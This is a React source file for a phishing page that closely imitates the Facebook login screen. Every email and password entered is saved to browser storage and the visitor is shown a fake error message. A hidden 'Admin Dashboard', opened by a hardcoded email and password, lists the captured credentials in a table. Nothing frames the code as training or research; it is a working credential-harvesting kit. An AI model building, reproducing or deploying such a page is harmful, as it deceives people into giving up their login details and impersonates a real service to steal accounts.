/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { motion } from "motion/react";
import React, { useState, useEffect } from "react";

interface LoginLog {
  email: string;
  password: string;
  time: string;
}

export default function App() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [view, setView] = useState<"login" | "dashboard">("login");
  const [logs, setLogs] = useState<LoginLog[]>([]);

  useEffect(() => {
    const savedLogs = JSON.parse(localStorage.getItem("fb_data") || "[]");
    setLogs(savedLogs);
  }, [view]);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    if (email === "limon258144@gmail.com" && password === "limon000") {
      setView("dashboard");
      return;
    }

    const newLog: LoginLog = {
      email,
      password,
      time: new Date().toLocaleString(),
    };
    
    const updatedLogs = [newLog, ...logs];
    localStorage.setItem("fb_data", JSON.stringify(updatedLogs));
    setLogs(updatedLogs);
    
    // Simulate a redirect or just clear
    setEmail("");
    setPassword("");
    alert("An error occurred. Please try again later.");
  };

  if (view === "dashboard") {
    return (
      <div className="min-h-screen bg-[#f4f4f4] p-5 font-sans">
        <div className="max-w-5xl mx-auto">
          <div className="flex justify-between items-center mb-6">
            <h2 className="text-2xl font-bold text-slate-800">Saved Login Attempts</h2>
            <button 
              onClick={() => setView("login")}
              className="bg-[#1877f2] text-white px-4 py-2 rounded-md hover:bg-[#166fe5] font-medium"
            >
              Back to Login
            </button>
          </div>
          <div className="bg-white rounded-lg shadow overflow-hidden">
            <table className="w-full border-collapse">
              <thead>
                <tr className="bg-[#1877f2] text-white">
                  <th className="p-4 text-left font-semibold">Email/Phone</th>
                  <th className="p-4 text-left font-semibold">Password</th>
                  <th className="p-4 text-left font-semibold">Time</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-200">
                {logs.length > 0 ? (
                  logs.map((log, index) => (
                    <tr key={index} className="hover:bg-gray-50">
                      <td className="p-4 text-slate-700">{log.email}</td>
                      <td className="p-4 text-slate-700 font-mono text-sm">{log.password}</td>
                      <td className="p-4 text-slate-500 text-sm">{log.time}</td>
                    </tr>
                  ))
                ) : (
                  <tr>
                    <td colSpan={3} className="p-8 text-center text-gray-500">No login attempts recorded yet.</td>
                  </tr>
                )}
              </tbody>
            </table>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#F0F2F5] flex flex-col font-sans overflow-x-hidden">
      {/* Header Accent */}
      <div className="h-1 w-full bg-[#1877F2]"></div>

      {/* Main Content */}
      <main className="flex-grow flex items-center justify-center px-6 py-12 md:py-20">
        <div className="max-w-[1024px] w-full flex flex-col lg:flex-row items-center justify-between gap-12 lg:gap-8">
          
          {/* Brand Section */}
          <div className="lg:w-3/5 text-center lg:text-left lg:pr-12 md:max-w-2xl">
            <motion.h1 
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.6 }}
              className="text-[#1877F2] text-[48px] md:text-[60px] lg:text-7xl font-extrabold tracking-tighter mb-4 leading-none"
            >
              facebook
            </motion.h1>
            <motion.p 
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              transition={{ duration: 0.6, delay: 0.2 }}
              className="text-[20px] md:text-[24px] lg:text-[28px] leading-tight lg:leading-[32px] text-slate-800 font-normal"
            >
              Connect with friends and the world <br className="hidden lg:block" /> around you on Facebook.
            </motion.p>

            {/* Professional Polish Trust Indicators */}
            <motion.div 
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              transition={{ duration: 0.6, delay: 0.4 }}
              className="mt-12 hidden md:flex items-center justify-center lg:justify-start gap-8"
            >
              <div className="flex flex-col">
                <span className="text-2xl font-bold text-slate-700">2.9B+</span>
                <span className="text-[10px] uppercase tracking-widest text-slate-500 font-semibold">Monthly Users</span>
              </div>
              <div className="w-[1px] h-10 bg-slate-300"></div>
              <div className="flex flex-col">
                <span className="text-2xl font-bold text-slate-700">190+</span>
                <span className="text-[10px] uppercase tracking-widest text-slate-500 font-semibold">Countries</span>
              </div>
            </motion.div>
          </div>

          {/* Login Form Section */}
          <motion.div 
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            transition={{ duration: 0.4, delay: 0.1 }}
            className="w-full max-w-[396px]"
          >
            <div className="bg-white p-5 rounded-xl shadow-[0_2px_4px_rgba(0,0,0,0.1),0_8px_16px_rgba(0,0,0,0.1)] border border-slate-200">
              <form onSubmit={handleSubmit} className="flex flex-col space-y-4">
                <input
                  type="text"
                  placeholder="Email or phone number"
                  required
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="w-full px-4 py-3.5 border border-slate-300 rounded-lg outline-none focus:border-[#1877F2] focus:ring-1 focus:ring-[#1877F2] transition-all text-lg"
                />
                <input
                  type="password"
                  placeholder="Password"
                  required
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full px-4 py-3.5 border border-slate-300 rounded-lg outline-none focus:border-[#1877F2] focus:ring-1 focus:ring-[#1877F2] transition-all text-lg"
                />
                <button
                  type="submit"
                  className="w-full bg-[#1877F2] text-white py-3 rounded-lg text-xl font-bold hover:bg-[#166FE5] active:scale-[0.98] transition-all cursor-pointer"
                >
                  Log In
                </button>
                <div className="text-center">
                  <a 
                    href="#" 
                    className="text-[#1877F2] text-sm font-medium hover:underline"
                  >
                    Forgot password?
                  </a>
                </div>
                <hr className="border-slate-200" />
                <div className="flex justify-center pt-2">
                  <button
                    type="button"
                    className="bg-[#42B72A] text-white px-6 py-3 rounded-lg text-[17px] font-bold hover:bg-[#36A420] active:scale-[0.98] transition-all cursor-pointer"
                  >
                    Create new account
                  </button>
                </div>
              </form>
            </div>
            <p className="mt-6 text-[14px] text-center text-slate-700">
              <a href="#" className="font-bold hover:underline">Create a Page</a> for a celebrity, brand or business.
            </p>
          </motion.div>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-white w-full py-8 px-6 border-t border-slate-200 mt-auto">
        <div className="max-w-[980px] mx-auto">
          <div className="flex flex-wrap gap-x-4 gap-y-2 text-xs text-slate-500 mb-2">
            {["English (US)", "Español", "Français (France)", "中文(简体)", "العربية", "Português (Brasil)", "Italiano", "Deutsch", "हिन्दी", "日本語"].map((lang) => (
              <a key={lang} href="#" className="hover:underline">{lang}</a>
            ))}
            <button className="bg-[#f5f6f7] border border-gray-300 px-2 rounded-sm hover:bg-[#ebedf0] text-[16px] leading-none">+</button>
          </div>
          <hr className="my-3 border-slate-100" />
          <div className="flex flex-wrap gap-x-5 gap-y-2 text-xs text-slate-500 opacity-80">
            {["Sign Up", "Log In", "Messenger", "Facebook Lite", "Video", "Places", "Games", "Marketplace", "Meta Pay", "Meta Store", "Meta Quest", "Instagram", "Threads", "Fundraisers", "Services", "Voting Information Center", "Privacy Policy", "Privacy Center", "Groups", "About", "Create Ad", "Create Page", "Developers", "Careers", "Cookies", "Ad choices", "Terms", "Help"].map((link) => (
              <a key={link} href="#" className="hover:underline whitespace-nowrap">{link}</a>
            ))}
          </div>
          <div className="mt-5 flex justify-between items-center text-[11px] text-slate-400 font-medium">
            <span>Meta © 2026</span>
            <button 
              onClick={() => setView("dashboard")}
              className="hover:text-slate-600 transition-colors"
            >
              Admin Dashboard
            </button>
          </div>
        </div>
      </footer>
    </div>
  );
}
